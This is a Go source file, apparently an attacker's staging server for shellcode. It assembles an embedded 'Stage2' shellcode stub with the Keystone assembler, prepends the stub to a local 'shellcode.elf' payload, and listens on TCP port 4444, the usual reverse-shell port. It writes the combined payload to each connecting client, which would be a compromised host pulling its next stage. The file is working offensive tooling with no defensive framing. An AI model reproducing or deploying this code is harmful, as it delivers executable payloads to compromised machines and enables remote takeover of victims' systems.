package main

import (
	"encoding/binary"
	"fmt"
	// "github.com/Binject/debug/elf"
	"debug/elf"
	log "github.com/sirupsen/logrus"
	"io"
	"net"
	"os"
	"strings"

	_ "embed"
	"github.com/keystone-engine/keystone/bindings/go/keystone"
)

//go:embed misc/Stage2.shellcode	
var TemplateStr  string

func deComment(asm string) string {
	var final string
	for _, each := range strings.Split(asm, "\n") {
		instruction := strings.SplitN(each, ";", 2)[0]
		if strings.TrimSpace(instruction) == "" {
			continue
		}
		final += instruction + "\n"
	}
	return final
}

func prependPayloadSize(payload []byte) []byte {
	payloadSize := uint32(len(payload))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, payloadSize)
	return append(lenBuf, payload...)
}

func GetEntryAddr(f *os.File) int {
	elfFile, err := elf.NewFile(f)
	if err != nil {
		log.Fatal(err)
	}
	entry := elfFile.Entry - 0x40000
	log.Infof("Found Entry: %v %x", entry, entry)
	return int(entry)
}

func MergeBytes(bs ...[]byte) []byte {
	var res []byte
	for _, b := range bs {
		res = append(res, b...)
	}
	return res
}

func main() {
	// 初始化 Keystone，选择架构和模式（例如 x86 32位）
	ks, err := keystone.New(keystone.ARCH_X86, keystone.MODE_64)
	if err != nil {
		log.Fatal("init failed:", err)
	}
	defer ks.Close() // 确保释放资源

	// 设置汇编语法（例如 Intel 语法）
	ks.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)

	f, err := os.Open("shellcode.elf")
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	var payload_addr = GetEntryAddr(f)
	f.Seek(0,0)
	payload, err := io.ReadAll(f)
	if err != nil {
		log.Fatal("Read shellcode elf failed", err)
	}

	var payload_len = len(payload)
	assembly := fmt.Sprintf(TemplateStr, fmt.Sprintf("0x%x",payload_len))
	assembly = deComment(assembly)
	// 汇编指令
	insn, _, ok := ks.Assemble(assembly, 0)
	if !ok {
		log.Fatal("asm failed, ", ks.LastError())
	}

	// 输出机器码的十六进制表示
	log.Infof("asm code: \n%s\nbytecode: \n%x\n", assembly, insn)
	log.Infof("payload_len: %v(%x)", payload_len, payload_len)
	log.Infof("payload_prefix: %v(%x)", payload[:10], payload[:10])
	log.Infof("payload Entry: %v(%x)", payload_addr, payload_addr)
	log.Infof("payload pre-payload: %v", insn)
	log.Infof("len of pre-payload payload: %v", len(insn))

	// finalpayload := MergeBytes(prependPayloadSize(insn), payload)
	finalpayload := MergeBytes(insn, (payload))
	// fmt.Printf("finalpayload: %x\n", finalpayload)

	l, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal(err)
	}
	defer l.Close()

	log.Info("started listener on 4444")
	for conn, err := l.Accept(); err == nil; conn, err = l.Accept() {
		log.Info("Get Connected!", conn)
		ConnectionWrite(conn, finalpayload)
		err = conn.Close()
	}
}

func ConnectionWrite(conn net.Conn, payload []byte) {
	nt, _ := conn.Write(payload)
	if nt != len(payload) {
		log.Warnf("write %d bytes, expect %d bytes", nt, len(payload))
	} else {
		log.Infof("write buf %v bytes", nt)
	}
}
